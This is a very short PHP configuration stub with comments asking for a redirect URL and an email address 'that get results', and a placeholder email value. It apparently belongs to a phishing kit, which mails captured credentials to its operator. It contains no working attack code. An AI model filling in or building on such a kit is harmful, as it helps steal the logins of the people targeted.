<?php
//Spcify Redirect URL

//Specify Email that get results.
$emailResult = "emaiiil";

?>